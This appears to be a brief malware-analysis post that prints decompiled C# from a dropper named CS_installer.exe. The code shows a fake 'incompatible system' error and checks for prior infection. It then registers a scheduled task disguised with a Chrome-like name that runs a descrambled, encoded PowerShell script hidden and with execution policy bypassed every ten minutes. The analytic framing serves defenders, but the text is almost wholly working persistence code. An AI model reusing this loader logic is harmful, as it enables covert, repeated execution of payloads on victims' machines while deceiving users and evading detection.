### Investigating and dissecting some of the source code from CS_installer.exe. It will be available to you if you need it.

Main
```cs
private static void Main(string[] args)
{
	if (Program.MessageBox((IntPtr)0, "Install Error, incompatible system", "Error", 5) == 99)
	{
		Environment.Exit(0);
	}
	using (TaskService ts = new TaskService())
	{
		using (IEnumerator<Task> enumerator = ts.AllTasks.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				if (enumerator.Current.Definition.Actions[0].ToString().Contains("powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E"))
				{
					Environment.Exit(0);
				}
			}
		}
		TaskDefinition td = ts.NewTask();
		td.RegistrationInfo.Description = "Example task";
		td.Triggers.Add<TimeTrigger>(new TimeTrigger(DateTime.Now.AddMinutes(1.0))
		{
			Repetition = new RepetitionPattern(TimeSpan.FromMinutes(10.0), TimeSpan.Zero, false)
		});
		string script = Program.deScramble();
		td.Actions.Add<ExecAction>(new ExecAction("cmd", "/c start /min \"\" powershell -ExecutionPolicy Bypass -WindowStyle Hidden -E " + script, null));
		string[] namesDict = new string[]
		{
			"Loader",
			"Monitor",
			"Checker",
			"Conf",
			"Task",
			"Updater"
		};
		int nameIndex = new Random().Next(namesDict.Length);
		string taskName = "Chrome" + namesDict[nameIndex];
		ts.RootFolder.RegisterTaskDefinition(taskName, td);
	}
}
```

